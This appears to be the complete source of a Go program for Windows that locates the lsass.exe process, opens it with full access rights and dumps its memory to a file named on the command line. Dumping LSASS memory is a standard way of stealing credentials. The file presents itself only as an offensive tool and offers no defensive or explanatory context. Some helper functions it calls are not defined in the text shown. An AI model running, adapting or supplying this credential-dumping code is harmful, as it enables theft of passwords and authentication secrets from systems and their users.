package main

import (
	"fmt"
	"os"
	"syscall"
	"unsafe"
)

func main() {

	fmt.Println("[!] Execute with elevated privileges.")

	if len(os.Args) != 2 { // no arg given - print usage info
		fmt.Println("[!] Usage: appName.exe <outFileName>")
	} else { // outfile defined - try dump lsass proc memory
		outFile := os.Args[1]
		procName := "lsass.exe"

		snapshot := CreateToolhelp32Snapshot(syscall.TH32CS_SNAPPROCESS, 0)

		if snapshot == 0 {
			fmt.Println("[!] Could not obtain handle to current process, aborting...")
			return
		}
		fmt.Printf("[+] Current Snapshot handle: %d\n", snapshot)

		var proc syscall.ProcessEntry32
		proc.Size = uint32(unsafe.Sizeof(proc))
		err := syscall.Process32First(syscall.Handle(snapshot), &proc)
		if err != nil {
			fmt.Println("[!] Could not obtain first process, aborting...")
			return
		}

		var hProcess uintptr
		var procAccess int32 = 0x001F0FFF
		for {
			if syscall.UTF16ToString(proc.ExeFile[:]) == procName {
				hProcess = OpenProcess(procAccess, false, proc.ProcessID)

				fmt.Printf("[+] Found LSASS process - PID: %d\n", proc.ProcessID)

				if hProcess == 0 {
					fmt.Println("[!] Could not obtain handle for lsass process, aborting...")
					return
				}

				fmt.Println("[+] LSASS proc handle obtained, dumping process memory...")

				hFile := CreateFileA(outFile,
					uint32(syscall.GENERIC_WRITE),
					uint32(syscall.FILE_SHARE_READ),
					uintptr(0),
					uint32(syscall.CREATE_ALWAYS),
					uint32(syscall.FILE_ATTRIBUTE_NORMAL),
					uintptr(0))
				if hFile == 0 {
					fmt.Printf("[!] Could not create a dump file!")
					return
				}
				fmt.Printf("[+] Created file and obtained handle.\n", hFile)
				fmt.Printf("[+] Dumping process memory to file: %s...\n", outFile)

				MiniDumpWriteDump(hProcess, proc.ProcessID, hFile, 2, uintptr(0), uintptr(0), uintptr(0))
				CloseHandle(hProcess)
				CloseHandle(hFile)
				fmt.Printf("[+] Done!")
				return
			}

			if err = syscall.Process32Next(syscall.Handle(snapshot), &proc); err != nil {
				fmt.Println("[+] Error occurred during processes enumeration, aborting...")
				break
			}
		}
	}
}
